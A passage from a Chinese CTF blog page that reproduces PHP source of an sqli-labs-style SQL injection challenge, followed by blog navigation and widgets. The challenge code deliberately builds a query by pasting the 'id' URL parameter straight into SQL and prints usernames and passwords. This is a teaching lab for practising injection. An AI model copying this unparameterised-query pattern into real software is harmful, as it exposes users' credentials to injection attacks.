class="string">'PHP_SELF'</span>]; /generating page address to piggy back after redirects...</span><br><span class="line">$characters = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>; /characterset <span class="keyword">for</span> generating random data</span><br><span class="line">$times= <span class="number">10</span>;</span><br><span class="line">$table = table_name();</span><br><span class="line">$col = column_name(<span class="number">1</span>);     / session id column name</span><br><span class="line">$col1 = column_name(<span class="number">2</span>);   /secret key column name</span><br><span class="line">/ Submitting the <span class="keyword">final</span> answer</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'answer_key'</span>]))&#123;</span><br><span class="line">	/ resetting the challenge <span class="keyword">and</span> repopulating the table .</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'reset'</span>]))&#123;</span><br><span class="line">		setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Redirecting you to main challenge page..........\n"</span>;</span><br><span class="line">		header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line">		<span class="comment">//echo "cookie expired";</span></span><br><span class="line">			</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		/ Checking the cookie on the page <span class="keyword">and</span> populate the table with random value.</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'challenge'</span>]))&#123;</span><br><span class="line">			$sessid=$_COOKIE[<span class="string">'challenge'</span>];</span><br><span class="line">			<span class="comment">//echo "Cookie value: ".$sessid;</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			$expire = time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">			$hash = data($table,$col);</span><br><span class="line">			setcookie(<span class="string">"challenge"</span>, $hash, $expire);</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">		/take the variables</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">			$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">			/logging the connection parameters to a file <span class="keyword">for</span> analysis.</span><br><span class="line">			$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">			fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">			fclose($fp);</span><br><span class="line">			/update the counter in database</span><br><span class="line">			next_tryy();</span><br><span class="line">			/Display attempts on screen.</span><br><span class="line">			$tryyy = view_attempts();</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"You have made : "</span>. $tryyy .<span class="string">" of $times attempts"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;\n"</span>;</span><br><span class="line">		  /Reset the Database <span class="keyword">if</span> you exceed allowed attempts.</span><br><span class="line">			<span class="keyword">if</span>($tryyy &gt;= ($times+<span class="number">1</span>))&#123;</span><br><span class="line">				setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"Redirecting you to challenge page..........\n"</span>;</span><br><span class="line">				header( <span class="string">"refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">			&#125;	</span><br><span class="line">		/ Querry DB to get the correct output</span><br><span class="line">			$sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">			$result=mysql_query($sql);</span><br><span class="line">			$row = mysql_fetch_array($result);</span><br><span class="line">			<span class="keyword">if</span>($row)&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FFFF"&gt;'</span>;	</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="comment">//				print_r(mysql_error());</span></span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;font color='#00FFFF': size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;('CHALLENGES')&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;"</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>==答案提交部分==<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;div  style=" color:#00FFFF; font-size:18px; text-align:center"&gt;'</span>;</span><br><span class="line">	$key = addslashes($_POST[<span class="string">'key'</span>]);</span><br><span class="line">	$key = mysql_real_escape_string($key);</span><br><span class="line">	<span class="comment">//echo $key;</span></span><br><span class="line">	/Query table to verify your result</span><br><span class="line">	$sql=<span class="string">"SELECT 1 FROM $table WHERE $col1= '$key'"</span>;</span><br><span class="line">	<span class="comment">//echo "$sql";</span></span><br><span class="line">	$result=mysql_query($sql)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error in submittion of Key Solution"</span>.mysql_error());</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-54-1.jpg" /&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>; </span><br><span class="line">		header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg" /&gt;'</span>;</span><br><span class="line">		header( <span class="string">"refresh:3;url=index.php"</span> );</span><br><span class="line">		<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">		&#125;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>@<a href="目录">TOC</a></p>

        </div>
        <!-- .entry-content -->
        <div class="single-reward">
          <div class="reward-open">赏
            <div class="reward-main">
              <ul class="reward-row">
                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0null"></li>
                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/donate/WeChanQR.jpg"></li>
              </ul>
            </div>
          </div>
        </div>
        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
        <footer class="post-footer">
          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
          <div class="post-tags">
          </div>
          <div class="post-share">
            <div class="social-share sharehidden share-component"></div>
            <i class="iconfont show-share icon-forward"></i>
          </div>
        </footer><!-- .entry-footer -->
      </article>
      <!-- #post-## -->
      <div class="toc" style="background: none;"></div>
      <section class="post-squares nextprev">
        
          
            <div class="post-nepre half previous">
          
            <a href="/2022/08/SSTI模板注入/" rel="prev">
              <div class="background">
                <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
              </div>
              <span class="label">
              Previous Post</span>
              <div class="info">
                <h3>
                SSTI模板注入</h3>
                <hr>
              </div>
            </a>
          </div>
        
        
          
            <div class="post-nepre half next">
          
            <a href="/2022/08/linux动态加载/" rel="next">
              <div class="background">
                <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://api.yimian.xyz/img?type=moe" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://api.yimian.xyz/img?type=moe">
              </div>
              <span class="label">
              Next Post</span>
              <div class="info">
                <h3>
                linux动态加载</h3>
                <hr>
              </div>
            </a>
          </div>
        
      </section>
      
<div id="vcomments"></div>
<script>
  window.onload = function(){
      var valine = new Valine();
      valine.init({
        el: '#vcomments',
        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
        path: window.location.pathname,
        placeholder: "你是我一生只会遇见一次的惊喜 ..."
      })
  }
</script>




      <section class="author-profile">
        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
          <a href="cns1rius.github.io" class="profile gravatar"><img src="/img/custom/avatar.jpg" itemprop="image" alt="s1rius" height="70" width="70"></a>
          <div class="meta">
            <span class="title">Author</span>
            <h3 itemprop="name">
            <a href="cns1rius.github.io" itemprop="url" rel="author">s1rius</a>
            </h3>
          </div>
        </div>
        <hr>
        <p><i class="iconfont icon-write"></i></p>
      </section>
    </main><!-- #main -->
  </div><!-- #primary -->
</div>



    </div>    
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            // PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
    <!-- <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 s1rius<br>
      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer> -->
<footer id="colophon" class="site-footer" role="contentinfo">
  <div class="site-info">
    <div class="footertext">
      <div class="img-preload">
        <img src="/img/other/wordpress-rotating-ball-o.svg">
        <img src="/img/other/disqus-preloader.svg">
      </div>
      <p style="color: #666666;">&copy 2018</p>
    </div>
    <div class="footer-device">
    <p style="font-family: 'Ubuntu', sans-serif;">
        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
        </span>
      </p>
    </div>
  </div><!-- .site-info -->
</footer>



<!-- <script src="/js/tocbot.js"></script> -->
<script type="text/javascript" src="/js/lib.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script type="text/javascript" src="/js/InsightSearch.js"></script>
<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
<script type="text/javascript" src="/js/zoom.min.js"></script>
<script type="text/javascript" src="/js/sakura-app.js"></script>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
<script src="/js/botui.js"></script>
<!-- 不蒜子 网页计数器 -->
<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
<script type="text/javascript">
/* <![CDATA[ */
if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  var Poi = {"pjax":"1","movies":{"url": "","name":"Unbroken.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
} else {
  var Poi = {"pjax":"1","movies":{"url": "","name":"Unbroken.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
}
/* ]]> */

</script>
<script>
$(document).ready(function() {
  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
    if ($(".pattern-center").length > 0) { //有图的情况
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -400,
          scrollSmoothOffset: -85
      });
    } else {
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -85,
          scrollSmoothOffset: -85
      });
    }
    var offsetTop = $('.toc').offset().top - 95;
    window.onscroll = function() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
      if (scrollTop >= offsetTop) {
        $('.toc').addClass('toc-fixed');
      } else {
        $('.toc').removeClass('toc-fixed');
      }
    }
  }
});
</script>

    <div class="openNav no-select" style="height: 50px;">
      <div class="iconflat no-select" style="width: 50px; height: 50px;">
        <div class="icon"></div>
      </div>
      <div class="site-branding search-form-submit">
        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
      </div>
    </div>
  </section>
  <div id="mo-nav" class="">
  <div class="m-avatar">
    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/avatar.jpg">
  </div>
  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">s1rius's blog</p>
  <p style="text-align: center; word-spacing: 20px;">
    
      
        <a href="http://github.com/cns1rius" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
      
        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=MjkxNjExNzQ3Mw==" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
      
    
  </p>
  <ul id="menu-new-1" class="menu">
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
            首页
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/archives">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
            归档
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/categories/ctf/">
                  <i class="fa fa-code" aria-hidden="true"></i>
                  ctf
                </a>
              </li>
            
              <li>
                <a href="/categories/资源/">
                  <i class="fa fa-cloud-download" aria-hidden="true"></i>
                  资源
                </a>
              </li>
            
              <li>
                <a href="/categories/随笔/">
                  <i class="fa fa-commenting-o" aria-hidden="true"></i>
                  随笔
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/comment/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
            留言板
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/links/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
            友人帐
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/donate/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
            赞赏
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
            关于
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/about/">
                  <i class="fa fa-meetup" aria-hidden="true"></i>
                  我
                </a>
              </li>
            
          </ul>
        
      </li>
    
  </ul>
  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
</div>
<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
<!-- require MetingJS -->
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
<style>
  .aplayer .aplayer-lrc {
    height: 35px;
  }
  .aplayer .aplayer-lrc p{
    font-size: 16px;
    font-weight: 700;
    line-height: 18px !important;
  }
  .aplayer .aplayer-lrc p.aplayer-lrc-current{
    color: #FF1493;
  }
  .aplayer.aplayer-narrow .aplayer-body{
    left: -66px !important;
  }
  .aplayer.aplayer-fixed .aplayer-lrc {
    display: none;
  }
  .aplayer .aplayer-lrc.aplayer-lrc-hide {
      display:none !important;
  }
  .aplayer.aplayer-fixed .lrc-show {
    display: block;
    background: rgba(255, 255, 255, 0.8);
  }
</style>
<meting-js

    id="8438651300"

    server="tencent"

    type="playlist"

    fixed="true"

    autoplay="true"

    loop="all"

    order="random"

    preload="auto"

    volume="0.7"

    mutex="true"

</meting-js>
<script>
  $(function(){
    $('body').on('click', '.aplayer', function(){
      if($('.aplayer-button').hasClass('aplayer-play')) {
        $('.aplayer-lrc').removeClass('lrc-show');
      } else {
        $('.aplayer-lrc').addClass('lrc-show');
      }
    })
  });
</script>
</body>
</html>